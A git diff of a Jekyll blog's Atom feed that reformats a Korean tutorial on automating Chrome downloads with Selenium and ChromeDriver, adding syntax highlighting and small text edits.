@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator>
   <link href="https://wind-flow.github.io/author/wind-flow/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://wind-flow.github.io/" rel="alternate" type="text/html" />
-  <updated>2022-03-25T17:09:11+09:00</updated>
+  <updated>2022-04-01T16:41:24+09:00</updated>
   <id>https://wind-flow.github.io/author/wind-flow/feed.xml</id>
 
   
@@ -59,7 +59,7 @@
 &lt;h1 id=&quot;구현-전략&quot;&gt;구현 전략&lt;/h1&gt;
 
 &lt;p&gt;크롬을 자동으로 띄우고, 로그인 후 다운로드를 받는 기능을 구현해야합니다.
-위의 기능을 구현하기위해서는 크롬을 동적으로 다룰 수 있는 &lt;strong&gt;셀레니움&lt;/strong&gt;과 &lt;strong&gt;Chrome driver&lt;/strong&gt;를 사용합니다.&lt;/p&gt;
+위의 기능을 구현하기 위해서는 크롬을 동적으로 다룰 수 있는 &lt;strong&gt;셀레니움&lt;/strong&gt;과 &lt;strong&gt;Chrome driver&lt;/strong&gt;를 사용합니다.&lt;/p&gt;
 
 &lt;h2 id=&quot;셀레니움-&quot;&gt;셀레니움 ?&lt;/h2&gt;
 
@@ -76,7 +76,7 @@
 &lt;h3 id=&quot;크롬-버전-확인하기&quot;&gt;크롬 버전 확인하기&lt;/h3&gt;
 
 &lt;p&gt;※ 해당 코드는 아래 포스트를 참고하여 작성하였습니다.
-[Python] 크롤링으로 업무 자동화 [https://dc7303.github.io/python/essay/2019/12/01/pythonMakedCrawler1/]&lt;/p&gt;
+[Python] (크롤링으로 업무 자동화)[https://dc7303.github.io/python/essay/2019/12/01/pythonMakedCrawler1/]&lt;/p&gt;
 
 &lt;ol&gt;
   &lt;li&gt;우측상단 더보기 아이콘 클릭 후 설정
@@ -91,24 +91,24 @@ https://chromedriver.chromium.org/downloads&lt;/p&gt;
 
 &lt;h3 id=&quot;셀레니움-사용하기&quot;&gt;셀레니움 사용하기&lt;/h3&gt;
 
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pip&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;selenum&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;pip install selenum
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;&lt;strong&gt;chromedirver.py&lt;/strong&gt; 파일을 생성하고, 셀레니움 webdriver를 import 합니다.&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from selenium import webdriver
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;selenium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;크롬-조작-인스턴스-정의&quot;&gt;크롬 조작 인스턴스 정의&lt;/h3&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from selenium import webdriver
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;selenium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;
 
-def generate_chrome(
-    driver_path: str,
-    download_path: str,
-    headless: bool=False
-    ) -&amp;gt; webdriver:
-    &quot;&quot;&quot;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;generate_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;driver_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;download_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
     크롭 웹드라이버 인스턴스 생성
 
     :param driver_path: 드라이버 경로
@@ -116,86 +116,162 @@ def generate_chrome(
     :param headless: headless 옵션 설정 플래그
 
     :return webdriver: 크롬 드라이버 인스턴스
-    &quot;&quot;&quot;
+    &quot;&quot;&quot;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;크롬-브라우저-옵션-세팅&quot;&gt;크롬 브라우저 옵션 세팅&lt;/h3&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from selenium import webdriver
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;selenium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;
 
-def generate_chrome(
-    driver_path: str,
-    download_path: str,
-    headless: bool=False
-    ) -&amp;gt; webdriver:
-    &quot;&quot;&quot;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;generate_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;driver_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;download_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
     크롭 웹드라이버 인스턴스 생성
 
     :param driver_path: 드라이버 경로
     :param download_path: 파일 다운로드 경로
     :param headless: headless 옵션 설정 플래그
     :return webdriver: 크롬 드라이버 인스턴스
-    &quot;&quot;&quot;
+    &quot;&quot;&quot;&lt;/span&gt;
 
-    options = webdriver.ChromeOptions()
-    if headless:
-        options.add_argument('headless')
-        options.add_argument('--disable-gpu')
-    options.add_experimental_option('prefs', {
-        'download.default_directory': download_path,
-        'download.prompt_for_download': False,
-        &quot;profile.default_content_settings.popups&quot;: 0,
-        &quot;safebrowsing.enabled&quot;: True
-    })
+    &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ChromeOptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'headless'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'--disable-gpu'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_experimental_option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'prefs'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;'download.default_directory'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;profile.default_content_settings.popups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;safebrowsing.enabled&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
 
-    chrome = webdriver.Chrome(executable_path=driver_path, options=options)
+    &lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executable_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;driver_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    if headless:
-        _enable_download_in_headless_chrome(chrome, download_path)
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;_enable_download_in_headless_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-    atexit.register(_close_chrome(chrome))       # 스크립트 종료전 무조건 크롬 종료
-
-    return chrome
+    &lt;span class=&quot;n&quot;&gt;atexit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_close_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;# 스크립트 종료전 무조건 크롬 종료
+&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;headless&lt;/strong&gt; : 브라우저 창을 띄우지않고 프로세스를 실행합니다.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;–disable-gpu&lt;/strong&gt; : 브라우저가 CPU의 부담을 줄이고자 렌더링 시 GPU를 사용하여 그래픽 가속을 하는데, GPU 버그가 일어날 수 있기때문에 GPU 사용을 disable 시킵니다.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;download.default_directory: download_path&lt;/strong&gt; : 다운로드 경로를 download_path로 설정합니다.
-&lt;strong&gt;download.prompt_for_download: False&lt;/strong&gt; :
-&lt;strong&gt;profile.default_content_settings.popups: 0&lt;/strong&gt; : 팝업을 금지합니다.
-&lt;strong&gt;safebrowsing.enabled: True&lt;/strong&gt; : 세이프 브라우징모드를 킵니다.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;download.default_directory: download_path&lt;/strong&gt; : 다운로드 경로를 download_path로 설정합니다.&lt;br /&gt;
+&lt;strong&gt;profile.default_content_settings.popups: 0&lt;/strong&gt; : 팝업을 금지합니다.&lt;br /&gt;
+&lt;strong&gt;safebrowsing.enabled: True&lt;/strong&gt; : 세이프 브라우징모드를 킵니다. 이 값이 없다면, exe파일 다운로드받을 때 경고창이 울려 자동으로 다운로드받지 못합니다.&lt;/p&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def _enable_download_in_headless_chrome(driver: webdriver, download_dir: str):
-        &quot;&quot;&quot;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_enable_download_in_headless_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;driver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
         headless does not allow file download: https://bugs.chromium.org/p/chromium/issues/detail?id=696481
         크롬 드라이버는 크롤링을 이용한 해킹을 예방하기 위해 기본적으로 headless 모드에서 다운로드를 지원하지 않는다.
         전문을 먼저 보내야 사용이 가능. 자세한 내용 위 링크 참조
         :param driver: 크롬 드라이버 인스턴스
         :param download_dir: 파일 다운로드 경로
-        &quot;&quot;&quot;
-        driver.command_executor._commands[&quot;send_command&quot;] = (&quot;POST&quot;, '/session/$sessionId/chromium/send_command')
+        &quot;&quot;&quot;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;driver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command_executor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;send_command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/session/$sessionId/chromium/send_command'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
-        params = {
-            'cmd': 'Page.setDownloadBehavior',
-            'params': {
-                'behavior': 'allow',
-                'downloadPath': download_dir
-            }
-        }
-        driver.execute(&quot;send_command&quot;, params)
+        &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Page.setDownloadBehavior'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;'params'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;'behavior'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'allow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;'downloadPath'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_dir&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;driver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;send_command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;def _close_chrome(chrome: webdriver):
-    &quot;&quot;&quot;
+&lt;h3 id=&quot;크롬-종료-함수&quot;&gt;크롬 종료 함수&lt;/h3&gt;
+
+&lt;p&gt;모든 프로세스가 끝나면 크롬을 종료합니다. atexit를 통해 프로세스 종료 직전에 실행됩니다.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_close_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
     크롬 종료
     :param chrome: 크롬 드라이버 인스턴스
-    &quot;&quot;&quot;
-    def close():
-        chrome.close()
-    return close
+    &quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;최종적인-chromedriver-코드&quot;&gt;최종적인 chromedriver 코드&lt;/h3&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;atexit&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;selenium&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_enable_download_in_headless_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;driver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+        headless does not allow file download: https://bugs.chromium.org/p/chromium/issues/detail?id=696481
+        크롬 드라이버는 크롤링을 이용한 해킹을 예방하기 위해 기본적으로 headless 모드에서 다운로드를 지원하지 않는다.
+        전문을 먼저 보내야 사용이 가능. 자세한 내용 위 링크 참조
+        :param driver: 크롬 드라이버 인스턴스
+        :param download_dir: 파일 다운로드 경로
+        &quot;&quot;&quot;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;driver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command_executor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_commands&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;send_command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'/session/$sessionId/chromium/send_command'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Page.setDownloadBehavior'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;s&quot;&gt;'params'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;'behavior'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'allow'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;s&quot;&gt;'downloadPath'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;download_dir&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;driver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;send_command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;_close_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
+    크롬 종료
+    :param chrome: 크롬 드라이버 인스턴스
+    &quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;generate_chrome&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;driver_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;download_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;headless&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;webdriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
